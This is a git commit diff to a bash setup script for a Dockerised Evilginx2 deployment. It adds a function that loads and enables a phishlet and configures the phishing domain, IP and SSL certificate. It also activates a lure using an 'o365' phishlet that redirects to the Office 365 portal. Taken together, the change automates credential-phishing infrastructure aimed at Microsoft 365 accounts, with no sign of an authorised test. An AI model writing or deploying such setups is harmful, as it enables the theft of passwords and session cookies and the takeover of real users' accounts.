6cde22a24e5043bd849b13b918e7d5243fdf9546
ColdCollapse <leopass299@gmail.com>
2024-10-15 20:11:11 +0800

    Update setup.sh

--- Evilginx2-docker/setup.sh
+++ Evilginx2-docker/setup.sh
@@ -1,4 +1,23 @@
 #!/bin/bash
+setup_evilginx() {
+    echo "Setting up Evilginx for domain: $domain_name"
+
+    # Load the phishlet
+    sudo evilginx phishlets upload "$phishlet_path"
+
+    # Enable the phishlet
+    sudo evilginx phishlets enable example
+
+    # Set up the hostname (domain or subdomain)
+    sudo evilginx config domain "$subdomain"
+
+    # Bind to the IP address
+    sudo evilginx config ip "$host_ip"
+
+    # Set up SSL using the provided certificate and key
+    sudo evilginx config sslkey "$ssl_key_path"
+    sudo evilginx config sslcert "$ssl_crt_path"
+}
 
 create_lure() {
     phishlet=$1
@@ -22,5 +41,7 @@ domain_name=$(jq -r '.EvilGinx2.Domain_Name' "$config_file")
 host_ip=$(jq -r '.EvilGinx2.Host_IP' "$config_file")
 ssl_key_path=$(jq -r '.EvilGinx2.SSL_Key_Path' "$config_file")
 ssl_crt_path=$(jq -r '.EvilGinx2.SSL_CRT_Path' "$config_file")
+
+
 # Automate multiple lure creation
-#create_lure "example" "phishing1.domain.com" "https://targetsite.com"
+create_lure "o365" $domain_name "https://portal.office.com"
